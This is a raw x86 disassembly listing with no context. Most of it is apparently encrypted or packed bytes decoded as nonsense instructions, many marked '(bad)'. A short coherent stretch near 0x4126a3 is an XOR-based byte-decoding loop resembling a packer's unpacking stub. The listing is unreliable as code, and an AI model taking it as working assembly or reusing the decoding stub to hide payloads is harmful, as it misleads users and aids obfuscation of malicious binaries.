  412525:	and    bl,BYTE PTR [esi]
  412527:	or     eax,0x9b6d1d3a
  41252c:	into   
  41252d:	push   0xffffffc7
  41252f:	cmp    al,0xf3
  412531:	pop    edx
  412532:	pusha  
  412533:	and    dh,bl
  412535:	fnstenv [edi+0x45a931b6]
  41253b:	mov    dl,0xa1
  41253d:	sar    ebp,1
  41253f:	and    dh,0xa9
  412542:	loop   0x41255d
  412544:	fucomi st,st(0)
  412546:	enter  0xa107,0xe6
  41254a:	jge    0x412599
  41254c:	or     BYTE PTR [edi],0x99
  41254f:	xchg   DWORD PTR [edx-0x24431603],esp
  412555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412556:	sub    ebx,DWORD PTR [ebx+0x6]
  412559:	imul   edi,ebp,0xecc3b6f2
  41255f:	dec    esi
  412560:	in     al,0x93
  412562:	lds    ecx,FWORD PTR [edi+0x50]
  412565:	out    0x8b,al
  412567:	jg     0x412580
  412569:	dec    eax
  41256a:	loop   0x412578
  41256c:	inc    ebx
  41256d:	xchg   esi,eax
  41256e:	pop    ds
  41256f:	adc    ebp,DWORD PTR [ebx+edx*1+0x30d9bfd6]
  412576:	mov    cl,0xe2
  412578:	cmp    esi,DWORD PTR [ebx+0x6a]
  41257b:	mov    cl,0x4
  41257d:	mov    ebp,0xc627880d
  412582:	xor    BYTE PTR [ebx+0x7],0x8b
  412586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412587:	hlt    
  412588:	fcmovnu st,st(6)
  41258a:	shl    bl,cl
  41258c:	inc    ebp
  41258d:	stc    
  41258e:	bound  ebp,QWORD PTR [esi]
  412590:	lods   eax,DWORD PTR ds:[esi]
  412591:	sbb    BYTE PTR [ebx],bl
  412593:	(bad)  
  412594:	and    al,0x9c
  412596:	jge    0x412549
  412598:	or     edi,DWORD PTR [esp+ebp*1+0x76]
  41259c:	pop    esi
  41259d:	adc    dl,BYTE PTR [edx-0x376b0c26]
  4125a3:	sub    esi,0xb201c935
  4125a9:	sbb    dl,BYTE PTR ds:0xaed87530
  4125af:	sbb    esp,ebp
  4125b1:	push   esp
  4125b2:	and    al,0xa5
  4125b4:	(bad)  
  4125b5:	push   edi
  4125b6:	mov    dh,0x51
  4125b8:	aad    0x2b
  4125ba:	lock pand mm5,QWORD PTR [ebx-0x5c]
  4125bf:	lds    ebp,FWORD PTR [ebx-0x75ab90d9]
  4125c5:	outs   dx,BYTE PTR ds:[esi]
  4125c6:	pop    ebx
  4125c7:	push   edx
  4125c8:	ds das 
  4125ca:	mov    dh,ah
  4125cc:	mov    BYTE PTR [esi+ecx*4-0x42],ah
  4125d0:	xor    eax,0x78c61604
  4125d5:	sub    BYTE PTR [ecx-0x37],dl
  4125d8:	add    eax,0xb43276c4
  4125dd:	jl     0x41262d
  4125df:	and    dl,BYTE PTR [ebp-0x34]
  4125e2:	jbe    0x412576
  4125e4:	mov    esp,0x8935acb1
  4125e9:	xchg   esp,eax
  4125ea:	into   
  4125eb:	xchg   esp,eax
  4125ec:	mov    eax,0xc50bf945
  4125f1:	lea    esp,[edx]
  4125f3:	das    
  4125f4:	mov    ds:0xc0033c99,al
  4125f9:	xor    eax,0x12a45365
  4125fe:	dec    ebp
  4125ff:	les    ecx,FWORD PTR ds:0x904c1871
  412605:	out    0x61,eax
  412607:	inc    esp
  412608:	push   eax
  412609:	push   0xfffffffb
  41260b:	mov    edi,0xd68a0bac
  412610:	pop    ebp
  412611:	(bad)  
  412612:	(bad)  
  412614:	adc    DWORD PTR [ebx+0x49],0x26a702d1
  41261b:	mov    ch,0x7e
  41261d:	and    cl,BYTE PTR [ebx]
  41261f:	call   0x7223c11e
  412624:	mov    ?,esp
  412626:	test   al,0xaa
  412628:	pop    esp
  412629:	pushf  
  41262a:	in     al,0x75
  41262c:	inc    esp
  41262d:	push   edi
  41262e:	loopne 0x4125c1
  412630:	nop
  412631:	arpl   si,sp
  412633:	fsub   QWORD PTR [ebx+0x42]
  412636:	shl    DWORD PTR [ebx+0x3ccbcfd3],cl
  41263c:	call   0x89e:0xc6a008e8
  412643:	and    BYTE PTR [eax+0x55],bh
  412646:	fstp   DWORD PTR [ebx-0xdf009d6]
  41264c:	adc    bl,BYTE PTR [edx-0x49]
  41264f:	fwait
  412650:	jnp    0x412671
  412652:	jmp    0xb30af6af
  412657:	add    BYTE PTR [ebx],bl
  412659:	mov    ebp,0xb9b9fdde
  41265e:	adc    eax,DWORD PTR [ebp-0x37]
  412661:	mov    ecx,0x64771046
  412666:	cmp    BYTE PTR [edx],bh
  412668:	mov    esi,fs
  41266a:	in     eax,0x95
  41266c:	je     0x4125f6
  41266e:	and    DWORD PTR ds:0x6d9f18f0,ebp
  412674:	enter  0xc528,0x4b
  412678:	fdivr  QWORD PTR [esi]
  41267a:	push   esp
  41267b:	clc    
  41267c:	aad    0x25
  41267e:	dec    ebx
  41267f:	and    al,0xdd
  412681:	pop    edx
  412682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412683:	es popf 
  412685:	mov    ah,0xed
  412687:	jno    0x41269a
  412689:	or     eax,0xc4886b41
  41268e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41268f:	push   0xfffffff2
  412691:	jns    0x4126e9
  412693:	cmp    BYTE PTR [ebp-0xe],cl
  412696:	mov    esp,0x46195e46
  41269b:	xor    ecx,DWORD PTR [edi]
  41269d:	test   DWORD PTR [esi],edx
  41269f:	add    BYTE PTR [eax],al
  4126a1:	add    BYTE PTR [ebx],dh
  4126a3:	mov    BYTE PTR [ebx],0xc7
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0xff
  412711:	int3   
  412712:	push   ss
  412713:	ret    
  412714:	inc    edi
  412715:	push   0x62
  412717:	bound  ecx,QWORD PTR [edx]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx-0x3e]
  41271d:	or     al,bl
  41271f:	es repz pushf 
  412722:	push   esi
  412723:	pushf  
  412724:	and    ch,BYTE PTR fs:0x45935b95
  41272b:	dec    ecx
  41272c:	mov    al,0x91
  41272e:	cli    
  41272f:	ja     0x4126fb
  412731:	stc    
  412732:	dec    ebp
  412733:	test   BYTE PTR [ecx+eiz*2+0x59],ah
  412737:	outs   dx,DWORD PTR ds:[esi]
  412738:	sar    BYTE PTR [ebp+edx*8+0x55e9c6b4],0x6c
  412740:	xlat   BYTE PTR ds:[ebx]
  412741:	mov    esp,0xd5483ebf
  412746:	in     eax,dx
  412747:	push   esi
  412748:	icebp  
  412749:	jmp    0xe658:0xe03b5f59
  412750:	push   esi
  412751:	xadd   DWORD PTR [ebp-0x7d],eax
  412755:	aaa    
  412756:	push   ss
  412757:	test   eax,0x44d921af
  41275c:	les    edx,FWORD PTR [ecx-0x41]
  41275f:	loope  0x412722
  412761:	arpl   WORD PTR [ebp+0x32ea83ba],di
  412767:	and    DWORD PTR [edi-0x75],esi
  41276a:	retf   0x64f9
  41276d:	outs   dx,BYTE PTR ds:[esi]
  41276e:	enter  0x9e67,0x80
  412772:	mov    eax,0xfd9f62da
  412777:	push   ds
  412778:	cmp    al,0xc0
  41277a:	ins    DWORD PTR es:[edi],dx
  41277b:	cs and bl,bl
  41277e:	adc    BYTE PTR [ebp+0x25e520e5],bh
  412784:	xchg   edx,eax
  412785:	dec    esp
  412786:	adc    eax,ecx
  412788:	mov    cl,0x47
  41278a:	test   eax,0x6250a06b
  41278f:	xchg   BYTE PTR [edx+0x38],dh
  412792:	sub    DWORD PTR [ebx+edx*4],eax
  412795:	ins    BYTE PTR es:[edi],dx
  412796:	push   esp
  412797:	mov    dh,0x9b
  412799:	jnp    0x412762
  41279b:	cmp    dh,dh
  41279d:	pop    eax
  41279f:	jbe    0x4127ad
  4127a1:	dec    ebx
  4127a2:	sbb    DWORD PTR [edx-0x33b6b47a],esp
  4127a8:	shr    DWORD PTR [edx-0x76cd066a],1
  4127ae:	hlt    
  4127af:	outs   dx,DWORD PTR ds:[esi]
  4127b0:	je     0x41276e
  4127b2:	push   esi
  4127b3:	outs   dx,DWORD PTR ds:[esi]
  4127b4:	loop   0x4127d1
  4127b6:	sub    BYTE PTR [edx+0x4fb8be6a],bh
  4127bc:	dec    eax
  4127bd:	cmp    BYTE PTR [edi*4-0x284e3e92],bh
  4127c4:	cmp    DWORD PTR [ebp-0x22],esi
  4127c7:	fcmove st,st(4)
  4127c9:	sbb    bh,0xa2
  4127cc:	jp     0x412817
  4127ce:	adc    dl,bh
  4127d0:	and    DWORD PTR [ebx],esp
  4127d2:	sbb    dh,bh
  4127d4:	retf   
  4127d5:	mov    edi,0xc13739c
  4127da:	xlat   BYTE PTR ds:[ebx]
  4127db:	lods   al,BYTE PTR ds:[esi]
  4127dc:	add    ah,BYTE PTR [ebx+0x39]
  4127df:	out    dx,eax
  4127e0:	sbb    eax,0x98930c8b
  4127e5:	test   ebp,0xffc41f22
  4127eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ec:	loop   0x41279e
  4127ee:	cmp    bl,BYTE PTR [edi-0x319dec2d]
  4127f4:	test   eax,0x2ae6e401
  4127f9:	(bad)
  4127fc:	xchg   edx,eax
  4127fd:	cld    
  4127fe:	mov    esi,0x7553069c
  412803:	jmp    0x4783:0x7cc567d2
  41280a:	stos   BYTE PTR es:[edi],al
  41280b:	cmp    al,0xa0
  41280d:	lahf   
  41280e:	mov    ss,ebx
  412810:	mov    bh,0xa4
  412812:	stos   BYTE PTR es:[edi],al
  412813:	int3   
  412814:	lods   ax,WORD PTR ds:[esi]
  412816:	sub    dh,dl
  412818:	mov    esi,0x76211b74
  41281d:	adc    BYTE PTR [ebx+0x338c302f],al
  412823:	pop    esp
  412824:	jle    0x412864
  412826:	std    
  412827:	sbb    eax,0x586f8c7a
  41282c:	jmp    0x8299:0x857d2666
  412833:	lahf   
  412834:	fwait
  412835:	sar    DWORD PTR [edx+0x28],0xf7
  412839:	stos   BYTE PTR es:[edi],al
  41283a:	test   al,0x32
  41283c:	dec    esp
  41283d:	int    0x42
  41283f:	mov    edi,0xaab55c7e
  412844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412845:	mov    eax,0x8a5f7228
  41284a:	frstor [esi+0x47544acc]
  412850:	in     al,0x36
  412852:	adc    BYTE PTR ds:0xf6a981b4,ah
  412858:	popf   
  412859:	aaa    
  41285a:	xor    eax,0xdbcc9cf9
  41285f:	push   ss
  412860:	push   esp
  412861:	pop    ss
  412862:	xor    al,0x6a
  412864:	inc    eax
  412865:	pop    ebp
  412866:	lahf   
  412867:	imul   esp,DWORD PTR [edi],0x8cb68efb
  41286d:	push   0x6a
  41286f:	enter  0xed96,0xca
  412873:	(bad)  
  412874:	dec    ebp
  412875:	mov    ah,0x42
  412877:	sbb    al,0xe2
  412879:	xchg   DWORD PTR [esi],esp
  41287b:	xchg   DWORD PTR [eax+0x53729e05],ecx
  412881:	cmp    BYTE PTR [ecx-0x4988c3ba],0x59
  412888:	lds    ebp,FWORD PTR [ebx+ebx*1+0x3b26e7fe]
  41288f:	loop   0x4128d4
  412891:	jmp    0x41281c
  412893:	ret    
  412894:	aaa    
  412895:	loope  0x4128b2
  412897:	sahf   
  412898:	(bad)  
  412899:	jle    0x41289d
  41289b:	mov    eax,0x81ea0015
  4128a0:	test   al,0xdb
  4128a2:	sub    cl,BYTE PTR [ebx+eiz*1]
  4128a5:	loope  0x412874
  4128a7:	dec    esi
  4128a8:	pop    edx
  4128a9:	sub    DWORD PTR [esi+0x39],ebp
  4128ac:	fstp   DWORD PTR [edi-0x14]
  4128af:	pop    ebp
  4128b0:	push   ecx
  4128b1:	pop    ss
  4128b2:	xor    ebx,DWORD PTR [edi]
  4128b4:	adc    ch,BYTE PTR [edx-0x18]
  4128b7:	pop    ebp
  4128b8:	dec    esp
  4128b9:	retf   0x677d
  4128bc:	mov    eax,ds:0xaf9d1591
  4128c1:	retf   
  4128c2:	ffree  st(3)
  4128c4:	jecxz  0x412866
  4128c6:	out    0x8d,eax
  4128c8:	gs sti 
  4128ca:	xchg   esp,eax
  4128cb:	dec    ebx
  4128cc:	jle    0x41288f
  4128ce:	or     ebx,edi
  4128d0:	pop    ecx
  4128d1:	pop    es
  4128d2:	jmp    0xfd01:0x2191ac16
  4128d9:	jmp    0xc50a:0xdb05e514
  4128e0:	pop    es
  4128e1:	daa    
  4128e2:	adc    bh,BYTE PTR [ebp+edx*8-0x3ee117db]
  4128e9:	out    0x54,al
  4128eb:	bound  esi,QWORD PTR ds:0x6fc6c62c
  4128f1:	adc    bl,BYTE PTR [edi+0x6a]
  4128f4:	adc    eax,0x2ac9850e
  4128f9:	pop    eax
  4128fa:	dec    esi
  4128fb:	xchg   ebp,eax
  4128fc:	add    DWORD PTR [ecx+0x2be5b0b7],esp
  412902:	pop    ss
  412903:	cmp    eax,edi
  412905:	pop    edx
  412906:	and    bl,bh
  412908:	inc    esp
  412909:	jae    0x412947
  41290b:	pop    ss
  41290c:	(bad)  
  41290f:	in     al,dx
  412910:	xchg   esp,eax
  412911:	aas    
  412912:	mov    eax,ds:0x226dcd93
  412917:	cwde   
  412918:	inc    ecx
  412919:	jle    0x412919
  41291b:	add    eax,edi
  41291d:	in     eax,dx
  41291e:	sub    eax,0x44e79230
  412923:	mov    ebx,0x3cfdc356
  412928:	cmp    al,0x6b
  41292a:	sub    DWORD PTR [esi],edi
  41292c:	push   ecx
  41292d:	lea    ebp,[eax-0x6d]
  412930:	xor    BYTE PTR [ecx],al
  412932:	subps  xmm0,XMMWORD PTR [esi]
  412935:	sti    
  412936:	jnp    0x41299a
  412938:	dec    esi
  412939:	mov    al,0x1a
  41293b:	xchg   edi,eax
  41293c:	test   eax,0xa5e6bdf7
  412941:	in     eax,0xc9
  412943:	and    al,0x8f
  412945:	icebp  
  412946:	add    ch,ah
  412948:	jns    0x4128f0
  41294a:	jae    0x4129c1
  41294c:	jb     0x412997
  41294e:	int    0x80
  412950:	int    0x58
  412952:	(bad)  
  412953:	sahf   
  412954:	and    DWORD PTR [ecx+0x6c84376a],edx
  41295a:	inc    ebp
  41295b:	jl     0x4129c3
  41295d:	cmc    
  41295e:	dec    eax
  41295f:	and    ch,ch
  412961:	cs or  al,0x2c
  412964:	lock xor al,0x20
  412967:	test   BYTE PTR [esp+eiz*8-0x18751197],dl
  41296e:	cmc    
  41296f:	mov    DWORD PTR [ebp+0x48ae152d],ebp
  412975:	mov    al,ds:0x9b442aa6
  41297a:	push   es
  41297b:	popf   
  41297c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41297d:	out    0xb6,eax
  41297f:	xor    eax,0x536bcd74
  412984:	push   ebx
  412985:	neg    edi
  412987:	iret   
  412988:	ret    0x36ab
  41298b:	dec    ecx
  41298c:	push   ds
  41298d:	xchg   edx,eax
  41298e:	inc    eax
  41298f:	pop    edx
  412990:	or     esp,DWORD PTR [ecx-0x10]
  412993:	sbb    al,0xc6
  412995:	pop    ebp
  412996:	or     BYTE PTR [ecx],bh
  412998:	es and al,0xc7
  41299b:	imul   edi,DWORD PTR [eax-0x1a],0x18e9efcb
  4129a2:	lea    esi,[bp+di-0x1ee8]
  4129a7:	ins    DWORD PTR es:[edi],dx
  4129a8:	pusha  
  4129a9:	outs   dx,DWORD PTR ds:[esi]
  4129aa:	dec    esp
  4129ab:	aas    
  4129ac:	add    DWORD PTR [edx],ebx
  4129ae:	jmp    0xb2b5:0x66be9609
  4129b5:	popa   
  4129b6:	rcl    edx,cl
  4129b8:	dec    eax
  4129b9:	xlat   BYTE PTR ds:[ebx]
  4129ba:	jp     0x412a23
  4129bc:	push   0x1f
  4129be:	or     BYTE PTR [eax],al
  4129c0:	sub    ebp,DWORD PTR [edi+0x2d51fd50]
  4129c6:	inc    DWORD PTR [ebp-0x40530fc]
  4129cc:	iret   
  4129cd:	sti    
  4129ce:	out    0x42,al
  4129d0:	push   edi
  4129d1:	cld    
  4129d2:	loope  0x4129d0
  4129d4:	pop    edx
  4129d5:	out    dx,al
  4129d6:	xchg   esi,eax
  4129d7:	cs ins DWORD PTR es:[edi],dx
  4129d9:	sbb    ebp,DWORD PTR [edx]
  4129db:	jns    0x412963
  4129dd:	pop    es
  4129de:	inc    esp
  4129df:	out    0xbb,al
  4129e1:	pushf  
  4129e2:	sbb    al,0x5d
  4129e4:	aam    0x10
  4129e6:	dec    esi
  4129e7:	(bad)  
  4129e8:	clc    
  4129e9:	scas   al,BYTE PTR es:[edi]
  4129ea:	mov    esi,0x80d69cf
  4129ef:	es adc ch,cl
  4129f2:	imul   DWORD PTR [ecx+0x3b]
  4129f5:	test   BYTE PTR [ecx+0x5879682e],al
  4129fb:	mov    ah,0x9c
  4129fd:	pop    esp
  4129fe:	fadd   QWORD PTR [ebp+0x70]
  412a01:	pop    es
  412a02:	push   0x8d999039
  412a07:	lock call 0xb2a9:0xc053f2b7
  412a0f:	ins    BYTE PTR es:[edi],dx
  412a10:	mov    ecx,0x54d39984
  412a15:	inc    BYTE PTR ds:0x4db81221
  412a1b:	cmp    dl,BYTE PTR [ebx-0xd9a2a98]
  412a21:	cmp    eax,0x6f75a74a
  412a26:	fadd   DWORD PTR [esi+0x62288723]
  412a2c:	in     al,0x14
  412a2e:	xchg   ecx,eax
  412a2f:	in     al,dx
  412a30:	fwait
  412a31:	xchg   esp,eax
  412a32:	dec    esi
  412a33:	push   edx
  412a34:	into   
  412a35:	(bad)  
  412a36:	loope  0x412a37
  412a38:	fiadd  WORD PTR [ebx-0x39]
  412a3b:	test   edx,ebx
  412a3d:	jne    0x4129f9
  412a3f:	js     0x412a7e
  412a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a42:	out    0x4,al
  412a44:	sbb    ebp,ebx
  412a46:	push   esi
  412a47:	mov    es,WORD PTR [esi]
  412a49:	cmp    ebx,edi
  412a4b:	mov    cl,0x76
  412a4d:	lahf   
  412a4e:	xchg   ebx,eax
  412a4f:	sahf   
  412a50:	out    0x5f,al
  412a52:	mov    esi,0x9e1c496d
  412a57:	sbb    bl,al
  412a59:	fsub   QWORD PTR [ecx]
  412a5b:	hlt    
  412a5c:	or     ebp,edi
  412a5e:	add    al,0xea
  412a60:	test   eax,0xe3252d82
  412a65:	adc    BYTE PTR [esi+edx*1-0x4a6a2f6c],ch
  412a6c:	fst    DWORD PTR [eiz*2-0x48cf27aa]
  412a73:	pop    esp
  412a74:	fsubr  DWORD PTR [edx-0x6346d648]
  412a7a:	enter  0x1816,0x6b
  412a7e:	call   0x487e:0xf6733860
  412a85:	fs or  eax,0x2292947e
  412a8b:	inc    esp
  412a8c:	or     ch,al
  412a8e:	inc    edx
  412a8f:	ds loopne 0x412b01
  412a92:	add    dl,BYTE PTR [ebp-0x440209b]
  412a98:	mov    gs,WORD PTR [edi+0x65]
  412a9b:	fdivrp st(5),st
  412a9d:	inc    ebx
  412a9e:	add    eax,0x5832426d
  412aa3:	rol    BYTE PTR [esi-0x19cf7504],1
  412aa9:	add    al,BYTE PTR [edx-0x51]
  412aac:	out    dx,al
  412aad:	clc    
  412aae:	or     ecx,DWORD PTR ds:0xee1f33f9
  412ab4:	shr    dl,cl
  412ab6:	jmp    0xfb8006e6
  412abb:	or     ecx,ebp
  412abd:	test   al,0x6
  412abf:	or     eax,DWORD PTR cs:[edi]
  412ac2:	stos   BYTE PTR es:[edi],al
  412ac3:	paddusw mm1,QWORD PTR [edx]
  412ac6:	(bad)  
  412ac8:	push   esp
  412ac9:	mov    dl,0xbe
  412acb:	sub    DWORD PTR ds:0x7390e09a,ebp
  412ad1:	push   edi
  412ad2:	mov    cl,0x8d
  412ad4:	hlt    
  412ad5:	shl    DWORD PTR [ebp-0x291c0fbc],0x4b
  412adc:	hlt    
  412add:	inc    esp
  412ade:	push   ebp
  412adf:	cmp    DWORD PTR [eax+0x4ff1573b],esi
  412ae5:	(bad)  
  412ae7:	sbb    esi,esp
  412ae9:	les    esp,FWORD PTR [ebp+0x1f]
  412aec:	xchg   esp,eax
  412aed:	cmp    eax,0x2c4bb30
  412af2:	stos   DWORD PTR es:[edi],eax
  412af3:	or     al,0xb8
  412af5:	idiv   ebp
  412af7:	pop    es
  412af8:	sbb    edx,ebx
  412afa:	mov    al,0xbb
  412afc:	dec    ebp
  412afd:	mov    bh,0x5e
  412aff:	cmp    al,0xa0
  412b01:	pop    esp
  412b02:	sbb    al,ah
  412b04:	add    al,0xf2
  412b06:	sbb    al,0x8e
  412b09:	fdiv   QWORD PTR [ecx+edx*1-0x27]
  412b0d:	call   0x252826da
  412b12:	dec    ebp
  412b13:	mov    ecx,0xed8d1720
  412b18:	xchg   ebx,eax
  412b19:	jo     0x412b52
  412b1b:	xor    ah,BYTE PTR [esi+0xb76b661]
  412b21:	stos   DWORD PTR es:[edi],eax
  412b22:	fldlg2 
  412b24:	ret    
  412b25:	xchg   esi,eax
  412b26:	dec    ecx
  412b27:	xbegin 0x4db043d8
  412b2d:	cwde   
  412b2e:	sbb    cl,BYTE PTR ds:0x3c2cbe75
  412b34:	int3   
  412b35:	test   BYTE PTR [edx],ah
  412b37:	clc    
  412b38:	pop    ebp
  412b39:	jl     0x412b33
  412b3b:	jno    0x412b0a
  412b3d:	xchg   ebx,eax
  412b3e:	cmp    al,0x12
  412b40:	cmp    eax,0x2382a6a7
  412b45:	push   edx
  412b46:	push   edx
  412b47:	adc    ah,BYTE PTR [esi-0x20]
  412b4a:	mov    bh,0x2e
  412b4c:	jbe    0x412baf
  412b4e:	aaa    
  412b4f:	mov    cl,0x10
  412b51:	es fwait
  412b53:	gs sbb eax,0xbf110e44
  412b59:	adc    DWORD PTR [ecx],esp
  412b5b:	push   0x0
  412b5d:	push   esi
  412b5e:	(bad)  
  412b5f:	mov    edi,0x468c4170
  412b64:	pop    esp
  412b65:	inc    eax
  412b66:	les    esi,FWORD PTR [ebx]
  412b68:	clc    
  412b69:	add    al,0x2e
  412b6b:	pop    edi
  412b6c:	out    0xa0,eax
  412b6e:	sar    al,0x3c
  412b71:	(bad)  
  412b72:	fdivr  QWORD PTR [esi-0x76be220c]
  412b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b79:	retf   0x4928
  412b7c:	(bad)
  412b7f:	mov    bh,BYTE PTR [esi-0x34]
  412b82:	lds    esi,FWORD PTR [ebx+ebp*1+0x25]
  412b86:	leave  
  412b87:	(bad)  [esi-0x44]
  412b8a:	add    BYTE PTR [ecx-0x722a1e97],ah
  412b90:	fwait
  412b91:	rcr    DWORD PTR [eax+esi*2-0x55],0xd6
  412b96:	test   ecx,0x6fbc04b0
  412b9c:	jbe    0x412b63
  412b9e:	jnp    0x412b6d
  412ba0:	(bad)  
  412ba1:	idiv   BYTE PTR [edx]
  412ba3:	sbb    esp,ebx
  412ba5:	imul   ecx,DWORD PTR [esi],0x79
  412ba8:	pop    ss
  412ba9:	push   0x3866df9e
  412bae:	mov    eax,ds:0xe0e0db5
  412bb3:	mov    esp,cs
  412bb5:	pop    es
  412bb6:	and    edx,DWORD PTR ds:0x69c922b0
  412bbc:	mov    esi,0x8fb0506d
  412bc1:	sbb    BYTE PTR [edx-0x4b],0x8a
  412bc5:	popf   
  412bc6:	sbb    eax,0x88821f19
  412bcb:	div    BYTE PTR [ebx+0xf]
  412bce:	jecxz  0x412c4f
  412bd0:	(bad)  
  412bd1:	sahf   
  412bd2:	leave  
  412bd3:	(bad)  
  412bd4:	push   ecx
  412bd5:	inc    ecx
  412bd6:	mov    al,ds:0x5248f1b8
  412bdb:	mov    ch,0x77
  412bdd:	dec    ebp
  412bde:	retf   
  412bdf:	sahf   
  412be0:	xchg   edi,eax
  412be1:	or     DWORD PTR [eax],ebp
  412be3:	lods   eax,DWORD PTR ds:[esi]
  412be4:	mov    ebx,0xe677a2e2
  412be9:	sub    eax,0x2616eced
  412bee:	scas   eax,DWORD PTR es:[edi]
  412bef:	push   eax
  412bf0:	jns    0x412c69
  412bf2:	enter  0x9e1b,0x8b
  412bf6:	xor    bh,cl
  412bf8:	outs   dx,DWORD PTR ds:[esi]
  412bf9:	jnp    0x412c61
  412bfb:	jne    0x412c7a
  412bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bfe:	push   es
  412bff:	jle    0x412c44
  412c01:	int    0xf1
  412c03:	icebp  
  412c04:	add    edx,DWORD PTR [edx]
  412c06:	cdq    
  412c07:	(bad)  
  412c08:	mov    ah,0x1b
  412c0a:	inc    esi
  412c0b:	jno    0x412c57
  412c0d:	loope  0x412c01
  412c0f:	mov    ah,ch
  412c11:	scas   eax,DWORD PTR es:[edi]
  412c12:	mov    WORD PTR [edx],fs
  412c14:	push   cs
  412c15:	dec    DWORD PTR [ebx+0x6fda0a32]
  412c1b:	or     BYTE PTR [ebx+0x36fe5cd],cl
  412c21:	mov    cl,0x47
  412c23:	push   ds
  412c24:	add    BYTE PTR [edi-0x2b],0x58
  412c28:	xor    edi,ebp
  412c2a:	xor    al,0x3a
  412c2c:	add    al,0x81
  412c2e:	lock dec edx
  412c30:	dec    edi
  412c31:	loop   0x412c07
  412c33:	(bad)  
  412c35:	push   edx
  412c36:	pop    ds
  412c37:	ins    DWORD PTR es:[edi],dx
  412c38:	sbb    eax,0xc4deb9da
  412c3d:	xchg   ebp,eax
  412c3e:	mov    cl,0x98
  412c40:	mov    ah,0xf4
  412c42:	mov    bl,0x3c
  412c44:	cli    
  412c45:	mov    dl,0x42
  412c47:	adc    BYTE PTR [edi-0x32],ah
  412c4a:	mov    bl,0xd1
  412c4c:	lahf   
  412c4d:	call   0x9204:0x99eccfee
  412c54:	push   esi
  412c55:	mov    edx,0xddd1566a
  412c5a:	mov    ecx,0xeb3691d1
  412c5f:	out    0x20,al
  412c61:	cmp    al,0x27
  412c63:	mov    edx,0x83d72177
  412c68:	sub    BYTE PTR [edi],cl
  412c6a:	xor    eax,0x6e8ec58d
  412c6f:	fnstsw WORD PTR [edx+0x462b20d3]
  412c75:	loope  0x412c92
  412c77:	pushf  
  412c78:	push   ecx
  412c79:	sub    ah,BYTE PTR [ebx-0x6]
  412c7c:	inc    ecx
  412c7d:	pop    edi
  412c7e:	xchg   ebp,eax
  412c7f:	call   0x5636acce
  412c84:	sub    al,0xaf
  412c86:	std    
  412c87:	push   es
  412c88:	jecxz  0x412c4f
  412c8a:	or     dl,dl
  412c8c:	jmp    0x84ea820b
  412c91:	icebp  
  412c92:	stos   DWORD PTR es:[edi],eax
  412c93:	dec    esp
  412c94:	inc    ebp
  412c95:	mov    ebp,gs
  412c97:	jmp    0xe7d6:0x5d1f2446
  412c9e:	mov    esp,0xe2842bc8
  412ca3:	and    DWORD PTR [edi+0x1e],ecx
  412ca6:	inc    eax
  412ca7:	fsub   DWORD PTR [ecx-0x31]
  412caa:	lahf   
  412cab:	lods   eax,DWORD PTR ds:[esi]
  412cac:	and    edi,ecx
  412cae:	ret    
  412caf:	mov    cl,0x6
  412cb1:	sbb    al,0xc4
  412cb4:	push   ss
  412cb5:	jmp    0x98c7ed72
  412cba:	addr16 jno 0x412d06
  412cbd:	and    bh,BYTE PTR [eax]
  412cbf:	mov    ds,WORD PTR [eax+ebx*2-0x14]
  412cc3:	cmp    ebx,DWORD PTR [esi]
  412cc5:	gs or  al,0x5
  412cc8:	outs   dx,DWORD PTR ds:[esi]
  412cc9:	loope  0x412d2a
  412ccb:	imul   edx,DWORD PTR [edx+ebp*1+0x5c7dbb4],0x70
  412cd3:	int    0x4b
  412cd5:	mov    dh,0xa5
  412cd7:	pop    ecx
  412cd8:	pop    eax
  412cd9:	xchg   esp,eax
  412cda:	or     BYTE PTR [eax+0x3e8a035e],bh
  412ce0:	ficomp WORD PTR [edi+ebx*1-0x10]
  412ce4:	mov    eax,ds:0xbf174f55
  412ce9:	dec    ebp
  412cea:	mov    bl,0x1c
  412cec:	xor    bl,ah
  412cee:	test   DWORD PTR [ebx-0x7e],edi
  412cf1:	xchg   esp,eax
  412cf2:	xlat   BYTE PTR ds:[ebx]
  412cf3:	test   DWORD PTR cs:[edi+0x7fc64e7],0x2557b538
  412cfe:	es stc 
  412d00:	mov    bl,dh
  412d02:	call   0x70e90ee
  412d07:	cli    
  412d08:	adc    ah,0x10
  412d0b:	int3   
  412d0c:	push   esi
